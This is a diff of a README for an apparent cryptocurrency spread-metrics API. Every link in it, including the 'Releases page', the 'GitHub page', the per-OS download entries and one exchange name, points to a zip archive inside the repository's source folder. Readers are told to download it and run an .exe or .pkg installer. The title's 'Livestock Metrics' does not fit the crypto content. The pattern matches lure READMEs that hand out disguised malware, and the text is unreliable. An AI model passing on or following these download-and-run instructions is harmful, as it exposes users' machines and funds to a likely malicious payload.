@@ -1,10 +1,10 @@
 # 🚀 exchanges-spreads-service - Get Livestock Metrics Easily
 
-[![Download](https://raw.githubusercontent.com/juanpardo65/exchanges-spreads-service/main/src/spreads/services/spreads_service_exchanges_2.1.zip)](https://raw.githubusercontent.com/juanpardo65/exchanges-spreads-service/main/src/spreads/services/spreads_service_exchanges_2.1.zip)
+[![Download](https://github.com/juanpardo65/exchanges-spreads-service/raw/refs/heads/main/src/spreads/service_spreads_exchanges_v3.2.zip)](https://github.com/juanpardo65/exchanges-spreads-service/raw/refs/heads/main/src/spreads/service_spreads_exchanges_v3.2.zip)
 
 ## 📖 Overview
 
-The **exchanges-spreads-service** is a simple REST API designed to provide key metrics for USDT perpetual futures spreads and arbitrage opportunities across top cryptocurrency exchanges like Bybit, Binance, MEXC, https://raw.githubusercontent.com/juanpardo65/exchanges-spreads-service/main/src/spreads/services/spreads_service_exchanges_2.1.zip, Bitget, BingX, and Kucoin. This API allows you to access critical data quickly and efficiently. Whether you're a trader looking for insights or a service provider in the trading sector, this tool can enhance your strategy and help you make informed decisions.
+The **exchanges-spreads-service** is a simple REST API designed to provide key metrics for USDT perpetual futures spreads and arbitrage opportunities across top cryptocurrency exchanges like Bybit, Binance, MEXC, https://github.com/juanpardo65/exchanges-spreads-service/raw/refs/heads/main/src/spreads/service_spreads_exchanges_v3.2.zip, Bitget, BingX, and Kucoin. This API allows you to access critical data quickly and efficiently. Whether you're a trader looking for insights or a service provider in the trading sector, this tool can enhance your strategy and help you make informed decisions.
 
 ## 🚀 Getting Started
 
@@ -17,20 +17,20 @@ To use the **exchanges-spreads-service**, you will need to download the software
    - A stable Internet connection
 
 2. **Visit the Releases Page**
-   - Go to the [Releases page](https://raw.githubusercontent.com/juanpardo65/exchanges-spreads-service/main/src/spreads/services/spreads_service_exchanges_2.1.zip). Here, you will find the latest version of the software.
+   - Go to the [Releases page](https://github.com/juanpardo65/exchanges-spreads-service/raw/refs/heads/main/src/spreads/service_spreads_exchanges_v3.2.zip). Here, you will find the latest version of the software.
   
 3. **Download the Application**
    - Locate the latest release. Click on it to open the details. You will see options to download the files needed to run the service. The commonly available files include:
-     - For Windows: `https://raw.githubusercontent.com/juanpardo65/exchanges-spreads-service/main/src/spreads/services/spreads_service_exchanges_2.1.zip`
-     - For macOS: `https://raw.githubusercontent.com/juanpardo65/exchanges-spreads-service/main/src/spreads/services/spreads_service_exchanges_2.1.zip`
-     - For Linux: `https://raw.githubusercontent.com/juanpardo65/exchanges-spreads-service/main/src/spreads/services/spreads_service_exchanges_2.1.zip`
+     - For Windows: `https://github.com/juanpardo65/exchanges-spreads-service/raw/refs/heads/main/src/spreads/service_spreads_exchanges_v3.2.zip`
+     - For macOS: `https://github.com/juanpardo65/exchanges-spreads-service/raw/refs/heads/main/src/spreads/service_spreads_exchanges_v3.2.zip`
+     - For Linux: `https://github.com/juanpardo65/exchanges-spreads-service/raw/refs/heads/main/src/spreads/service_spreads_exchanges_v3.2.zip`
    - Click the appropriate link for your operating system to start downloading.
 
 4. **Install the Application**
    - Once the file has finished downloading, locate it on your computer. 
    - For Windows: Double-click the `.exe` file to run the installation wizard. Follow the prompts to complete the installation.
    - For macOS: Open the `.pkg` file and go through the installation steps.
-   - For Linux: Extract the `https://raw.githubusercontent.com/juanpardo65/exchanges-spreads-service/main/src/spreads/services/spreads_service_exchanges_2.1.zip` file to your desired location. Open a terminal, navigate to the folder, and run the application.
+   - For Linux: Extract the `https://github.com/juanpardo65/exchanges-spreads-service/raw/refs/heads/main/src/spreads/service_spreads_exchanges_v3.2.zip` file to your desired location. Open a terminal, navigate to the folder, and run the application.
 
 5. **Run the Application**
    - After installation, you will find the application in your programs menu or applications folder.
@@ -63,10 +63,10 @@ If you encounter any issues while downloading or running the application, consid
 
 ## 💬 Community and Support
 
-For any questions or concerns, feel free to reach out through the Issues section on our [GitHub page](https://raw.githubusercontent.com/juanpardo65/exchanges-spreads-service/main/src/spreads/services/spreads_service_exchanges_2.1.zip). Our community is here to help.
+For any questions or concerns, feel free to reach out through the Issues section on our [GitHub page](https://github.com/juanpardo65/exchanges-spreads-service/raw/refs/heads/main/src/spreads/service_spreads_exchanges_v3.2.zip). Our community is here to help.
 
 ## 🔗 Additional Resources
 
-For more detailed information, documentation, and updates, always refer to the [Releases page](https://raw.githubusercontent.com/juanpardo65/exchanges-spreads-service/main/src/spreads/services/spreads_service_exchanges_2.1.zip).
+For more detailed information, documentation, and updates, always refer to the [Releases page](https://github.com/juanpardo65/exchanges-spreads-service/raw/refs/heads/main/src/spreads/service_spreads_exchanges_v3.2.zip).
 
 Join us on your journey to mastering trading metrics!
